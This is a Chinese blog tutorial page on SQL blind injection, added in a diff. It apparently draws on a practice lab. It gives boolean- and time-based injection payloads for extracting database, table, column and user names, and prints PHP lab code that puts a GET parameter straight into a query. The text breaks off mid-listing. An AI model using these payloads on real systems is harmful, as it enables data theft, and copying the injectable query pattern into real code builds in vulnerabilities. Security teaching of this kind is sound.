@@ -1,0 +1,689 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="SQL盲注什么是SQL盲注盲注是SQL注入的其中一种，是在SQL注入的基础上，根据根据SQL注入的回显不同来进行判断的 什么叫回显的不同，举个例子 1SELECT * FROM users WHERE id&#x3D;&amp;#x27;$id&amp;#x27; LIMIT 0,1  执行这个语句进行查询，如果你能看到查询到的数据，就叫做有回显，如果你没看到查询的具体信息，只告诉你查询成功等信息，甚至什么都不说，但是在这">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Em4non&#39;s Blog">
+<meta property="og:url" content="http://example.com/2022/12/03/SQL%E7%9B%B2%E6%B3%A8/index.html">
+<meta property="og:site_name" content="Em4non&#39;s Blog">
+<meta property="og:description" content="SQL盲注什么是SQL盲注盲注是SQL注入的其中一种，是在SQL注入的基础上，根据根据SQL注入的回显不同来进行判断的 什么叫回显的不同，举个例子 1SELECT * FROM users WHERE id&#x3D;&amp;#x27;$id&amp;#x27; LIMIT 0,1  执行这个语句进行查询，如果你能看到查询到的数据，就叫做有回显，如果你没看到查询的具体信息，只告诉你查询成功等信息，甚至什么都不说，但是在这">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-12-03T07:28:22.000Z">
+<meta property="article:modified_time" content="2022-12-03T07:28:22.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Em4non&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="/%3Chttps:/lib.baomitu.com/twitter-bootstrap/4.6.1/%3E/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="/%3Chttps:/lib.baomitu.com/github-markdown-css/4.0.0/%3E/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="/%3Chttps:/lib.baomitu.com/hint.css/2.7.0/%3E/hint.min.css" />
+
+  <link  rel="stylesheet" href="/%3Chttps:/lib.baomitu.com/fancybox/3.5.7/%3E/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Em4non Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-12-03 15:28" pubdate>
+          2022年12月3日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          46 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h1><h2 id="什么是SQL盲注"><a href="#什么是SQL盲注" class="headerlink" title="什么是SQL盲注"></a>什么是SQL盲注</h2><p>盲注是SQL注入的其中一种，是在SQL注入的基础上，根据根据SQL注入的回显不同来进行判断的</p>
+<p>什么叫回显的不同，举个例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">SELECT * FROM users WHERE id=<span class="hljs-string">&#x27;$id&#x27;</span> LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>执行这个语句进行查询，如果你能看到查询到的数据，就叫做有回显，如果你没看到查询的具体信息，只告诉你查询成功等信息，甚至什么都不说，但是在这个过程中，SQL语句被执行了，SQL注入也发生了，只是我们拿不到注入的结果</p>
+<p>那么遇到查不到详细信息的情况怎么办呢，就需要用到SQL盲注的知识，可以理解为一种爆破</p>
+<p>比如他只告诉你查询成功和查询失败，那么你就可以这样去问</p>
+<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs erlang">如果<span class="hljs-string">&quot;数据库名&quot;</span>的第<span class="hljs-number">1</span>个字母是a，你就说“查询成功”，否则就说“查询失败”<br>如果<span class="hljs-string">&quot;数据库名&quot;</span>的第<span class="hljs-number">1</span>个字母是b，你就说“查询成功”，否则就说“查询失败”<br>如果<span class="hljs-string">&quot;数据库名&quot;</span>的第<span class="hljs-number">1</span>个字母是c，你就说“查询成功”，否则就说“查询失败”<br>...<br>如果<span class="hljs-string">&quot;数据库名&quot;</span>的第<span class="hljs-number">2</span>个字母是a，你就说“查询成功”，否则就说“查询失败”<br>如果<span class="hljs-string">&quot;数据库名&quot;</span>的第<span class="hljs-number">2</span>个字母是b，你就说“查询成功”，否则就说“查询失败”<br>如果<span class="hljs-string">&quot;数据库名&quot;</span>的第<span class="hljs-number">2</span>个字母是c，你就说“查询成功”，否则就说“查询失败”<br>...<br></code></pre></td></tr></table></figure>
+
+<p>这样通过不断的测试，从数据库名开始测试，到数据库表名，再到字段名，再到具体的数据，这样就可以成功进行SQL注入，查询到我们所需要的信息，而SQL查询结构是被<code>WHERE</code>子句所控制的，所以攻击者一般就是对<code>WHERE</code>子句进行构造</p>
+<h2 id="盲注的分类"><a href="#盲注的分类" class="headerlink" title="盲注的分类"></a>盲注的分类</h2><p>总的来说，可以分成布尔盲注和时间盲注</p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>就是我们上面举例所说的，WEB应用只返回查询成功和查询失败，通过成功和失败进行判断是否查到了我们需要的信息</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>那如果遇到完全无回显的情况怎么办呢，连成功和失败都不告诉你，就需要用到时间盲注，通过响应的时长进行判断，如果满足xx条件，就sleep指定时间，否则就不sleep，这样只要看服务器是否延时响应即可进行判断</p>
+<h2 id="如何进行盲注"><a href="#如何进行盲注" class="headerlink" title="如何进行盲注"></a>如何进行盲注</h2><h3 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>一般情况下题目是不会给到具体的源码的，所以需要我们自己去猜测后端执行sql查询的命令是什么</p>
+<p>查询语句的构造一般都是这样的</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> xx <span class="hljs-keyword">from</span> xx <span class="hljs-keyword">where</span> xx <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$id&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>在这个语句中，只有$id是我们可控的，所以我们盲注的第一步，是要找到id这个注入点</p>
+<p>然后，找到了注入点之后，就需要开始构造我们的查询语句了</p>
+<p>我们首先猜测他的语句是这样</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$id&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>之前我们讲过，要查询具体的数据，首先要知道数据库名</p>
+<p>那我们先开始测试数据库名的长度</p>
+<p>根据他给的语句我们可以进行如下构造</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> length(database())<span class="hljs-operator">&gt;</span><span class="hljs-number">1</span> #<br></code></pre></td></tr></table></figure>
+
+<p>在测试出数据库名的长度之后，我们就可以继续测试数据库的表名了</p>
+<p>这里就需要用到一个叫做substr的函数了</p>
+<p>这个函数的作用是截取字符串</p>
+<p><strong>substr(strings,m,n)</strong></p>
+<p>strings ：被截取的字符串或字符串表达式</p>
+<p>m 从第m个字符开始截取</p>
+<p>n 截取后字符串长度为n</p>
+<p>简单的说，就是<code>substr(要截取的字符串，从哪一位开始截取，截取多长)</code></p>
+<p>还有几种substr的替代品</p>
+<p>比如<code>mid()</code>，这个函数的用法和substr一样</p>
+<p><code>right()</code>，right(截取的字符串，截取长度)</p>
+<p><code>trim()</code>，TRIM([{BOTH | LEADING | TRAILING} [remstr] FROM str)表示移除str这个字符串首尾（BOTH）&#x2F;句首（LEADING）&#x2F;句尾（TRAILING）的remstr</p>
+<p>然后我们再次尝试如下构造</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;a&#x27;</span> #<br></code></pre></td></tr></table></figure>
+
+<p>经过这样爆破，我们也可以知道数据库的库名了，接下来就是去找我们需要查的表名</p>
+<p>我们需要先了解一下<strong>information_schema</strong>，这是一个存储数据库信息的数据库，里面存了Mysql服务器所维护的所有数据库的各类信息</p>
+<p>我们一般只关注两张表：tables 和 columns</p>
+<p>先查security数据库中第一个表名的长度</p>
+<p>所以我们的构造如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (<span class="hljs-keyword">select</span> length(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-number">6</span> #<br></code></pre></td></tr></table></figure>
+
+<p>在查询出了表名长度之后，我们可以继续对表名进行爆破</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;e&#x27;</span> #<br></code></pre></td></tr></table></figure>
+
+<p>接下来就是字段名的爆破</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;i&#x27;</span>#<br></code></pre></td></tr></table></figure>
+
+<p>接下来就是针对字段名进行数据的爆破</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> substr((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> security.users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;D&#x27;</span> #<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//including the Mysql connect parameters.</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;../sql-connections/sql-connect.php&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// take the variables</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><br><span class="hljs-comment">//logging the connection parameters to a file for analysis.</span><br><span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&#x27;ID:&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br><br><span class="hljs-comment">// connectivity </span><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)<br>    &#123;<br>    	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;<br>    	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You are in...........&#x27;</span>;<br>    	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <br>    &#123;<br><br>    	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;<br>    	<span class="hljs-comment">//echo &#x27;You are in...........&#x27;;</span><br>    	<span class="hljs-comment">//print_r(mysql_error());</span><br>    	<span class="hljs-comment">//echo &quot;You have an error in your SQL syntax&quot;;</span><br>    	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;<br>    	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;<br>    &#125;<br>    &#125;<br>    	<span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>首先还是对数据库名的长度进行猜测</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> if(length(database())<span class="hljs-operator">=</span><span class="hljs-number">5</span> ,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">0</span>) #<br></code></pre></td></tr></table></figure>
+
+<p>再对数据库名进行猜测</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> if((<span class="hljs-keyword">select</span> substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;s&#x27;</span> ,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">0</span>) #<br></code></pre></td></tr></table></figure>
+
+<p>对数据库表名长度进行猜测</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> if((<span class="hljs-keyword">select</span> length(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-number">6</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">0</span>) #<br></code></pre></td></tr></table></figure>
+
+<p>对数据库表名进行猜测</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> if((<span class="hljs-keyword">select</span> substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;s&#x27;</span> ,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">0</span>) #<br></code></pre></td></tr></table></figure>
+
+<p>对数据库字段名进行猜测</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> if(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;i&#x27;</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">0</span>)#<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//including the Mysql connect parameters.</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;../sql-connections/sql-connect.php&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// take the variables</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-comment">//logging the connection parameters to a file for analysis.</span><br><span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&#x27;ID:&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br><br><span class="hljs-comment">// connectivity </span><br><br><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)<br>        &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You are in...........&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span 